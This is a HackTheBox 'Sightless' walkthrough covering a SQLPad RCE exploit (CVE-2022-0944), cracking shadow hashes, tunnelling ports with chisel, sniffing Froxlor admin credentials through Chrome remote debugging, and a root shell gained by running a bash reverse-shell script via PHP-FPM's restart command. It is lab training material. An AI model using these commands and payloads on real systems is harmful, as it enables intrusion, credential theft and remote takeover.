

## Reconnaissance

### nmap 

![](IMG/0.png)

### WebSite 

![](IMG/1.png)

> Enumerate this site.
> Find the following different subdomain --> sqlpad

![](IMG/2.png)

> But I have to add it to /etc/hosts first
> Then it will show the following page 

![](IMG/3.png)

> Search exploit for sqlpad
> Find the following useful github
> It's a vulnerability with CVE number - CVE-2022-0944

- [(GITHUB)SQLPad RCE Exploit](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)

![](IMG/4.png)

![](IMG/5.png)

> Here are a reference which explain this CVE more detail

- [(huntr)Template injection in connection test endpoint leads to RCE in sqlpad/sqlpad](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

![](IMG/6.png)

## Exploit 

> Then I first tried to execute the poc payload from github

```
python exploit.py http://sqlpad.sightless.htb 10.10.14.72 443
```

![](IMG/7.png)

> Listener 
> I just got a root user !!! ??? 
> But the hostname .... it's not the common one

![](IMG/8.png)

> Check the root directory 
> Ok... I may land in docker ... 

![](IMG/9.png)

> Just for a record ... getting fully interactive shell 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-z (back to host)
stty raw -echo; fg 

### Then back to shell, insert the following command 
export TERM=xterm (or)
export SHELL=bash
```

- [A Step-by-Step Guide to turning a basic reverse shell into a fully interactive terminal using Python](https://medium.com/@dineshkumaar478/a-step-by-step-guide-to-turning-a-basic-reverse-shell-into-a-fully-interactive-terminal-using-41c512e5e0cc)

![](IMG/10.png)

> So I start to enumerate 
> With linpeas first 

![](IMG/11.png)

![](IMG/12.png)

![](IMG/13.png)

> I just expected that I have to escape from docker 
> but ...  the linpeas result provide some credential in /etc/passwd

![](IMG/17.png)

![](IMG/16.png)

> I tried to crack it, and it got the following credential 

```
hashcat -m 1800 michael.hash  /usr/share/wordlists/rockyou.txt
```

```
michael / 123456
```

![](IMG/14.png)

> I tried to login with this password, but it failed. 

![](IMG/15.png)

> Then I find another password hash point to same user in /etc/shadow 

![](IMG/18.png)

![](IMG/19.png)

![](IMG/20.png)

> I crack it again.

```
hashcat michael2.hash -m 1800 /usr/share/wordlists/rockyou.txt
```

![](IMG/21.png)

> Got another credential 

```
michael / insaneclownposse
```

![](IMG/22.png)

> Login to target server (not docker ) with michael

![](IMG/23.png)

![](IMG/24.png)

![](IMG/25.png)

> user flag 

![](IMG/29.png)

## Privilege Escalation 

> After a bunch of enumeration (include linpeas)
> I find there are some internal service running

![](IMG/26.png)

> I tried to port forwarding the port 8080 to external first 
> Tool:  Chisel 

- Server side 

```
./chisel_arm64 server -p 1080 --reverse
```

![](IMG/27.png)

- Client side 

```
./chisel client 10.10.14.72:1080 R:8080:127.0.0.1:8080 &
```

![](IMG/28.png)

> Then I can check this internal web site from external 
> It's a  froxlor website (login page)

![](IMG/38.png)

> I also tried some credential but all failed
> And I can't find any useful exploit code

![](IMG/30.png)

> Then, back to the victim server with michael.
> I also notice this one in linpeas result - john using chrome to do some remote debuggin
> Keyword: **remote-debugging-port**

```
opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.4V6555 data:
```

![](IMG/31.png)
#### chrome - remote debug

![](IMG/32.png)

> Some of article explain

- [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)

```
The **Chrome DevTools Protocol** allows for tools to instrument, inspect, debug and profile Chromium, Chrome and other Blink-based browsers.
Instrumentation is divided into a number of domains (DOM, Debugger, Network etc.). Each domain defines a number of commands it supports and events it generates. Both commands and events are serialized JSON objects of a fixed structure.

This is especially handy to understand how the DevTools frontend makes use of the protocol. You can view all requests/responses and methods as they happen.
```

![](IMG/33.png)

- [Key Component - Chrome DevTools](https://www.headspin.io/blog/ultimate-guide-chrome-remote-debugging)
```
The cornerstone of Chrome remote debugging is the Chrome Developer Tools (DevTools), an integrated web development and debugging tool suite. DevTools includes features like the Elements panel for inspecting HTML and CSS, the Console for running JavaScript, the Network panel for analyzing network activity, and the Sources panel for setting breakpoints and debugging JavaScript code.
```

![](IMG/34.png)

> The most direct explain this port which related to security is this one 

- [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

![](IMG/35.png)
![](IMG/36.png)

> So far, I know some user used chrome remote debug port to inspect some service (maybe the internal website) in the victim 
> Then, I may use this protocol to monitor some sensitive file, too.
> But there are a lot of internal ports open 
> Hence I just forward all of them to external as follow

- Client side 

```
./chisel_linux64 client 10.10.14.104:1080 R:3000:127.0.0.1:3000 R:8000:127.0.0.1:8080 R:33060:127.0.0.1:33060 R:45735:127.0.0.1:45735 R:127.0.0.1:44089 R:3306:127.0.0.1:3306 R:38871:127.0.0.1:38871 &
```

![](IMG/37.png)

> Then start the chrome debug

1. Start the chrome
2. Access this URL 
```
chrome://inspect/#devices
```

![](IMG/40.png)

> Set up those ports by clicking "Configure.." and insert those port as following image

![](IMG/39.png)

> After setting up, it will show the following target

![](IMG/41.png)

> Then clicking the "inspect", it will start to show the froxlor page and debug it
> The following screen will display


![](IMG/42.png)
> Observing for a while, I can find that someone login to froxlor success

![](IMG/43.png)

> I can record the session, but it will expire very fast

![](IMG/44.png)

> Then I also find it will disclose the plaintext credential in "Network" pane

![](IMG/45.png)

```
admin / FroxlorfroxAdmin
```
![](IMG/46.png)

> Using it to login

![](IMG/47.png)

> Enumerate this service 
> I can find the vulnerability in PHP-FPM
> It can set the restart command 
> Hence I just key the following payload which will success 

```
bash /tmp/revhahaha.sh
```

![](IMG/48.png)

> Before I use it, I upload the exploit shell file to target, the contents as follow 

```
#!/bin/bash
#
#
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.104/1337 0>&1'
```

![](IMG/49.png)

> Wait for a while, I can find that my listener get shell 

![](IMG/50.png)

 > Get root flag
 
![](IMG/51.png)
## Reference 

### Writeup

- [Sightless — HTB Walkthrough](https://medium.com/@jfjbn4/sightless-htb-walkthrough-e4d78d374eb0
- [Sightless | Hackthebox](https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b)

### Discussion 

- [Official Sightless Discussion](https://forum.hackthebox.com/t/official-sightless-discussion/323940/190
### CVE-2022-0944

- [(GITHUB)SQLPad RCE Exploit](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)
- [(GITHUB)CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)
- [(GITHUB)CVE-2022-0944-2](https://github.com/shhrew/CVE-2022-0944)
- [(huntr)Template injection in connection test endpoint leads to RCE in sqlpad/sqlpad](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

### Crack password hash (shadow file)

- [Hashcat破解/etc/shadow](https://blog.csdn.net/m0_43406494/article/details/116736263)
- [Hashcat hash type](https://hashcat.net/wiki/doku.php?id=example_hashes)

### Chisel 

- [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#client)
- [Port Forwarding with Chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
- [(GITHUB)chisel](https://github.com/jpillora/chisel)
### Chrome - Remote Debug

- [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [Key Component - Chrome DevTools](https://www.headspin.io/blog/ultimate-guide-chrome-remote-debugging)
- [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)
### Other 

#### Interactive Shell 

- [A Step-by-Step Guide to turning a basic reverse shell into a fully interactive terminal using Python](https://medium.com/@dineshkumaar478/a-step-by-step-guide-to-turning-a-basic-reverse-shell-into-a-fully-interactive-terminal-using-41c512e5e0cc)

###### tag: `HackTheBox`